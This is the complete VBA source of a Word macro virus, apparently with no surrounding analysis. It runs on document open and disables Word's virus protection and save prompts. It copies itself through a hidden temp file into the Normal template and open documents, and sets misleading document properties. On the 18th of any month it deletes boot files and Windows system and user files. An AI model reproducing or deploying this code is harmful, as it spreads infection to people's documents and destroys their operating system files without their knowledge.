   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   On Error Resume Next
   s = ActiveDocument.Saved
   Application.EnableCancelKey = Not -1
   With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
   If Dir("c:\windows\temp\temp.asc", 0) = "" Then
   Open "c:\windows\temp\temp.asc" For Output As #1
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Print #1, a
   Next i
   Close #1
   SetAttr "c:\windows\temp\temp.asc", 1
   End If
   Dim Heute, Tag
   Heute = Now
   Tag = Day(Heute)
   If Tag = 18 Then
   Kill "c:\autoexec.bat"
   Kill "c:\config.sys"
   Kill "c:\windows\system.*"
   Kill "c:\windows\user.*"
   Kill "c:\windows32\system.*"
   Kill "c:\windows32\user.*"
   End If
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
   Set t = NormalTemplate.VBProject.VBComponents.Item(1)
   ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
   Set t = ActiveDocument.VBProject.VBComponents.Item(1)
   Else
   t = ""
   End If
   If t <> "" Then
   Open "c:\windows\temp\temp.asc" For Input As #1
   If LOF(1) = 0 Then GoTo q
   i = 1
   Do While Not EOF(1)
   Line Input #1, a
   t.CodeModule.InsertLines i, a
   i = i + 1
   Loop
   q:
   Close #1
   With Dialogs(wdDialogFileSummaryInfo): .Title = "Total Annihilation": .Author = "Cavedog Ent.": .Execute: End With
   If Left(ActiveDocument.Name, 8) <> "Dokument" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
   End If
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
   End Sub
